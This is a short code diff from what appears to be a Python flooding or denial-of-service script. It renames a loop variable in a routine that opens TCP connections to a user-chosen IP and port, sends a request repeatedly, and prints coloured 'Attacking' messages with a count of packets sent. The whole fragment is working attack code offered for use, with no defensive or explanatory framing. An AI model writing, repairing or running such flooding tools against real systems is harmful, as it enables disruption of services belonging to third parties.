@@ -103,9 +103,9 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            for i in range(pack):
+            for i in range(packs):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
+            xx += random.randint(0, int(packs))
             print("\033[33m[+\033[33m]\033[31mAttacking {0}:{1} |\033[96mSent:::.. {2}\033[0m").format(str(ip), int(port), xx)
         finally:
             s.close()
